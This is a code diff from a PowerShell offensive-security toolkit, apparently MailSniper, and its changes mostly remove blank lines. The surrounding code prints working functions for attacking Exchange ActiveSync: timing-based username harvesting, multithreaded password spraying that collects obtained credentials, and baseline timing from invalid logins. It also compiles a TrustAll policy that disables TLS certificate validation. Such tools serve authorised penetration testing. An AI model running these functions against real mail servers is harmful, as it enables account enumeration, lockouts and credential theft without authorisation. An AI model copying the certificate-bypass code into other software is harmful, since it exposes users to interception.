@@ -3265,7 +3943,6 @@ function Invoke-UsernameHarvestEAS {
     [Parameter(Position = 5, Mandatory = $False)]
     [string]
     $Threads = "1"
-
   )
     
     Write-Host -ForegroundColor "yellow" "[*] Now spraying EAS portal at https://$ExchHostname/Microsoft-Server-ActiveSync"
@@ -3281,11 +3958,8 @@ function Invoke-UsernameHarvestEAS {
     if ($Password -eq "") {
         $Password = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
     }
-
-
     ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
     ## Code From http://poshcode.org/624
-
     ## Create a compilation environment
     $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
     $Compiler=$Provider.CreateCompiler()
@@ -3294,7 +3968,6 @@ function Invoke-UsernameHarvestEAS {
     $Params.GenerateInMemory=$True
     $Params.IncludeDebugInformation=$False
     $Params.ReferencedAssemblies.Add("System.DLL") > $null
-
     $TASource=@'
     namespace Local.ToolkitExtensions.Net.CertificatePolicy{
       public class TrustAll : System.Net.ICertificatePolicy {
@@ -3310,25 +3983,19 @@ function Invoke-UsernameHarvestEAS {
 '@ 
     $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
     $TAAssembly=$TAResults.CompiledAssembly
-
     ## We now create an instance of the TrustAll and attach it to the ServicePointManager
     $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
     [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
-
-
     ##This "primes" the username harvesting. First few names in the list can produce weird results, so use throwaways.
     for( $i = 0; $i -lt 5; $i++ ){
         $Users += -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
     }
-
     $Users += $Usernames
-
     $AvgTime = Get-BaseLineResponseTimeEAS -EASURL $EASURL -Domain $Domain
     $AvgTime = $AvgTime[-1]
     Write-Host "AvgTime: " $AvgTime
     $Thresh = $AvgTime * 0.6
     Write-Host "Threshold: " $Thresh
-
     $fullresults = @()
 	
     ## end code from http://poshcode.org/624
@@ -3364,7 +4031,6 @@ function Invoke-UsernameHarvestEAS {
             $fullresults += $CurrUser
         }
     }
-
     Write-Host -ForegroundColor "yellow" ("[*] A total of " + $fullresults.count + " potentially valid usernames found.")
     if ($OutFile -ne "")
        {
@@ -3372,85 +4038,57 @@ function Invoke-UsernameHarvestEAS {
             Write-Host "Results have been written to $OutFile."
        }
 }
-
-
 function Invoke-PasswordSprayEAS{
 <#
   .SYNOPSIS
-
     This module will first attempt to connect to Exchange Active Sync (EAS) and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
-
     MailSniper Function: Invoke-PasswordSprayEAS
     Author: Steve Motts (@fugawi72) and Beau Bullock (@dafthack) (mostly a copy and paste of Fehrman/Bullock's Invoke-PasswordSpray OWA function)
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
-
     .DESCRIPTION
-
         This module will first attempt to connect to EAS and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
-
     .PARAMETER ExchHostname
-
         The hostname of the Exchange server to connect to.
  
     .PARAMETER OutFile
-
         Outputs the results to a text file.
-
     .PARAMETER UserList
-
         List of usernames 1 per line to to attempt to password spray against.
-
     .PARAMETER Password
-
         A single password to attempt a password spray with.
-
     .PARAMETER Threads
        
         Number of password spraying threads to run.
-
     .PARAMETER Domain
-
         Specify a domain to be used with each spray. Alternatively the userlist can have users in the format of DOMAIN\username or username@domain.com
-
   
   .EXAMPLE
-
     C:\PS> Invoke-PasswordSprayEAS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt
-
     Description
     -----------
     This command will connect to EAS at https://mail.domain.com/owa/ and attempt to password spray a list of usernames with a single password over 15 threads and write to a file called owa-sprayed-creds.txt.
-
 #>
   Param(
-
-
     [Parameter(Position = 0, Mandatory = $false)]
     [system.URI]
     $ExchHostname = "",
-
     [Parameter(Position = 1, Mandatory = $False)]
     [string]
     $OutFile = "",
-
     [Parameter(Position = 2, Mandatory = $False)]
     [string]
     $UserList = "",
-
     [Parameter(Position = 3, Mandatory = $False)]
     [string]
     $Password = "",
-
     [Parameter(Position = 4, Mandatory = $False)]
     [string]
     $Threads = "5",
-
     [Parameter(Position = 6, Mandatory = $False)]
     [string]
     $Domain = ""
-
   )
     
     Write-Host -ForegroundColor "yellow" "[*] Now spraying EAS at https://$ExchHostname/Microsoft-Server-ActiveSync/"
@@ -3472,7 +4110,6 @@ function Invoke-PasswordSprayEAS{
 	
     ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
     ## Code From http://poshcode.org/624
-
     ## Create a compilation environment
     $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
     $Compiler=$Provider.CreateCompiler()
@@ -3481,7 +4118,6 @@ function Invoke-PasswordSprayEAS{
     $Params.GenerateInMemory=$True
     $Params.IncludeDebugInformation=$False
     $Params.ReferencedAssemblies.Add("System.DLL") > $null
-
     $TASource=@'
     namespace Local.ToolkitExtensions.Net.CertificatePolicy{
       public class TrustAll : System.Net.ICertificatePolicy {
@@ -3497,11 +4133,9 @@ function Invoke-PasswordSprayEAS{
 '@ 
     $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
     $TAAssembly=$TAResults.CompiledAssembly
-
     ## We now create an instance of the TrustAll and attach it to the ServicePointManager
     $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
     [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
-
     $Password = $args[1]
     $EASURL = $args[2]
     $Domain = $args[3]
@@ -3569,7 +4203,6 @@ While ($(Get-Job -State Running).count -gt 0)
       $fullresults += $JobOutput
     }
 }
-
 Write-Output ("[*] A total of " + $fullresults.count + " credentials were obtained.")
 if ($OutFile -ne "")
   {
@@ -3584,76 +4217,51 @@ Write-Host "Time Taken: " $ElapsedTime
 $CurTime = Get-Date -Format g
 Write-Host "Time: " $CurTime
 }
-
-
 function Get-BaseLineResponseTimeEAS {
 <#
   .SYNOPSIS
-
     This module performs a series of invalid login attempts against an OWA portal in order to determine the baseline response time for invalid users or invalid domains
-
     MailSniper Function: Get-BaseLineResponseTime
     Author: Brian Fehrman (@fullmetalcache)
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
-
     .DESCRIPTION
-
        This module is used to help determine the average time taken for an OWA server to respond when it is given either an invalid domain with an invalid username or a valid domain with an invalid username.
        
        Note that there is a better method for obtaining the mail's internal domain name. This will be added in future versions. This and the timing attacks are detailed by Nate Power (http://securitypentest.com/).
-
     .PARAMETER OWAURL
-
         OWAURL for the portal (typicallyof the form  https://<mailserverurl>/owa/auth.owa)
-
     .PARAMETER OWAURL2
         OWAURL2 for the portal (typically of the form https://<mailserverurl>/owa/)
-
     .PARAMETER Domain
         Correct Domain name for the User/Environment (if previously obtained)
-
   
   .EXAMPLE
-
     C:\PS> Get-BaseLineResponseTime -OWAURL https://mail.company.com/owa/auth.owa -OWAURL2 https://mail.company.com/owa/
-
     Description
     -----------
     This command will get the baseline response time for when an invalid domain name is provided to the owa portal.
-
   .EXAMPLE
-
     C:\PS> Get-BaseLineResponseTime -OWAURL https://mail.company.com/owa/auth.owa -OWAURL2 https://mail.company.com/owa/ -Domain ValidInternalDomain
-
     Description
     -----------
     This command will get the baseline response time for when a valid domain name and an invalid username are provided to the owa portal
-
 #>
     Param(
-
-
     [Parameter(Position = 0, Mandatory = $True)]
     [string]
     $EASURL = "",
-
     #[Parameter(Position = 1, Mandatory = $True)]
     #[string]
     #$OWAURL2 = "",
-
     [Parameter(Position = 2, Mandatory = $False)]
     [string]
     $Domain = ""
-
     )
-
     $Users = @()
-
     for($i = 0; $i -lt 5; $i++) { 
         $UserCurr = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
-
         if( $Domain -eq "" ) {
             $DRand = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
             $Users += $Drand + "\" + $UserCurr
@@ -3662,12 +4270,9 @@ function Get-BaseLineResponseTimeEAS {
             $Users += $Domain + "\" + $UserCurr
         }
     }
-
     $Password = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
-
     $AvgTime = 0.0
     $NumTries = 0.0
-
  ## end code from http://poshcode.org/624
     Write-Host ""
     Write-Host "Determining baseline response time..."
@@ -3690,12 +4295,9 @@ function Get-BaseLineResponseTimeEAS {
         $NumTries += 1.0
         $AvgTime += $TimeTaken
     }
-
     $AvgTime /= $NumTries
-
     Write-Host ""
     Write-Host "`t Baseline Response: $AvgTime"
     Write-Host ""
-
     return $AvgTime
-}   
+}
